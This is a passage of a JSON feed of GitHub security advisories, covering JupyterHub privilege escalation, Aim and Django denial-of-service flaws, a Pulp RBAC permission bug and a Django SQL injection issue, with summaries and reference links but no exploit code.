            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If a user is granted the <code>admin:users</code> scope, they may escalate their own privileges by making themselves a full admin user.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>admin:users</code> scope allows a user to edit user records:</p>\n<blockquote>\n<p>admin:users</p>\n<p>Read, write, create and delete users and their authentication state, not including their servers or tokens.</p>\n<p>-- <a href=\"https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes\">https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes</a></p>\n</blockquote>\n<p>However, this includes making users admins. Admin users are granted scopes beyond <code>admin:users</code> making this a mechanism by which granted scopes may be escalated.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The impact is relatively small in that <code>admin:users</code> is already an extremely privileged scope only granted to trusted users.\nIn effect, <code>admin:users</code> is equivalent to <code>admin=True</code>, which is not intended.</p>\n<p>Note that the change here only prevents escalation to the built-in JupyterHub admin role that has unrestricted permissions. It does not prevent users with e.g. <code>groups</code> permissions from granting themselves or other users permissions via group membership, which is intentional.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f\">https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428\">https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba\">https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41942\">https://nvd.nist.gov/vuln/detail/CVE-2024-41942</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x4q-3gxw-849f\">https://github.com/advisories/GHSA-9x4q-3gxw-849f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x4q-3gxw-849f",
            "title": "[jupyterhub] JupyterHub has a privilege escalation vulnerability with the `admin:users` scope",
            "date_modified": "2024-08-08T16:59:55.000Z",
            "date_published": "2024-08-08T14:37:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x4q-3gxw-849f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in aimhubio/aim version 3.19.3 allows an attacker to cause a denial of service by configuring the remote tracking server to point at itself. This results in the server endlessly connecting to itself, rendering it unable to respond to other connections.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6227\">https://nvd.nist.gov/vuln/detail/CVE-2024-6227</a></li>\n<li><a href=\"https://huntr.com/bounties/abcea7c6-bb3b-45e9-aa15-9eb6b224451a\">https://huntr.com/bounties/abcea7c6-bb3b-45e9-aa15-9eb6b224451a</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/blob/2e7b8aff8dcba9ddd5043dfec88cf2319ba8a87c/aim/sdk/repo.py#L195\">https://github.com/aimhubio/aim/blob/2e7b8aff8dcba9ddd5043dfec88cf2319ba8a87c/aim/sdk/repo.py#L195</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-36h2-g4c8-9xcm\">https://github.com/advisories/GHSA-36h2-g4c8-9xcm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-36h2-g4c8-9xcm",
            "title": "[aim] Aim denial of service vulnerability",
            "date_modified": "2024-08-07T20:38:43.000Z",
            "date_published": "2024-07-08T21:31:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-36h2-g4c8-9xcm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in the Pulp package. When a role-based access control (RBAC) object in Pulp is set to assign permissions on its creation, it uses the <code>AutoAddObjPermsMixin</code> (typically the add_roles_for_object_creator method). This method finds the object creator by checking the current authenticated user. For objects that are created within a task, this current user is set by the first user with any permissions on the task object. This means the oldest user with model/domain-level task permissions will always be set as the current user of a task, even if they didn't dispatch the task. Therefore, all objects created in tasks will have their permissions assigned to this oldest user, and the creating user will receive nothing.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-7143\">https://nvd.nist.gov/vuln/detail/CVE-2024-7143</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-7143\">https://access.redhat.com/security/cve/CVE-2024-7143</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2300125\">https://bugzilla.redhat.com/show_bug.cgi?id=2300125</a></li>\n<li><a href=\"https://github.com/pulp/pulpcore/blob/93f241f34c503da0fbac94bdba739feda2636e12/pulpcore/tasking/_util.py#L108\">https://github.com/pulp/pulpcore/blob/93f241f34c503da0fbac94bdba739feda2636e12/pulpcore/tasking/_util.py#L108</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9m5j-4xx9-44j9\">https://github.com/advisories/GHSA-9m5j-4xx9-44j9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9m5j-4xx9-44j9",
            "title": "[pulpcore] Pulp incorrectly assigns RBAC permissions in tasks that create objects",
            "date_modified": "2024-08-07T19:45:32.000Z",
            "date_published": "2024-08-07T18:30:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9m5j-4xx9-44j9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize and urlizetrunc template filters, and the AdminURLFieldWidget widget, are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41991\">https://nvd.nist.gov/vuln/detail/CVE-2024-41991</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/aug/06/security-releases\">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927\">https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927</a></li>\n<li><a href=\"https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f\">https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r836-hh6v-rg5g\">https://github.com/advisories/GHSA-r836-hh6v-rg5g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r836-hh6v-rg5g",
            "title": "[Django] Django vulnerable to denial-of-service attack",
            "date_modified": "2024-08-08T15:01:00.000Z",
            "date_published": "2024-08-07T15:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r836-hh6v-rg5g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize and urlizetrunc template filters, and the AdminURLFieldWidget widget, are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41991\">https://nvd.nist.gov/vuln/detail/CVE-2024-41991</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/aug/06/security-releases\">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927\">https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927</a></li>\n<li><a href=\"https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f\">https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r836-hh6v-rg5g\">https://github.com/advisories/GHSA-r836-hh6v-rg5g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r836-hh6v-rg5g",
            "title": "[Django] Django vulnerable to denial-of-service attack",
            "date_modified": "2024-08-08T15:01:00.000Z",
            "date_published": "2024-08-07T15:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r836-hh6v-rg5g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42005\">https://nvd.nist.gov/vuln/detail/CVE-2024-42005</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/aug/06/security-releases\">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d\">https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d</a></li>\n<li><a href=\"https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28\">https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pv4p-cwwg-4rph\">https://github.com/advisories/GHSA-pv4p-cwwg-4rph</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pv4p-cwwg-4rph",
            "title": "[Django] Django SQL injection vulnerability",
            "date_modified": "2024-08-07T19:02:44.000Z",
            "date_published": "2024-08-07T15:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pv4p-cwwg-4rph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42005\">https://nvd.nist.gov/vuln/detail/CVE-2024-42005</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/aug/06/security-releases\">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d\">https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d</a></li>\n<li><a href=\"https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28\">https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pv4p-cwwg-4rph\">https://github.com/advisories/GHSA-pv4p-cwwg-4rph</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pv4p-cwwg-4rph",
            "title": "[Django] Django SQL injection vulnerability",
            "date_modified": "2024-08-07T19:02:44.000Z",
            "date_published": "2024-08-07T15:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pv4p-cwwg-4rph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize() and urlizetrunc() template filters are subject to a potential denial-of-service attack via very large inputs with a specific sequence of characters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41990\">https://nvd.nist.gov/vuln/detail/CVE-2024-41990</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/aug/06/security-releases\">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/7b7b909579c8311c140c89b8a9431bf537febf93\">https://github.com/django/django/commit/7b7b909579c8311c140c89b8a9431bf537febf93</a></li>\n<li><a href=\"https://github.com/django/django/commit/d0a82e26a74940bf0c78204933c3bdd6a283eb88\">https://github.com/django/django/commit/d0a82e26a74940bf0c78204933c3bdd6a283eb88</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-68.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-68.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-795c-9xpc-xw6g\">https://github.com/advisories/GHSA-795c-9xpc-xw6g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-795c-9xpc-xw6g",
            "title": "[Django] Django vulnerable to a denial-of-service attack",
            "date_modified": "2024-08-07T19:02:14.000Z",
            "date_published": "2024-08-07T15:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-795c-9xpc-xw6g"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}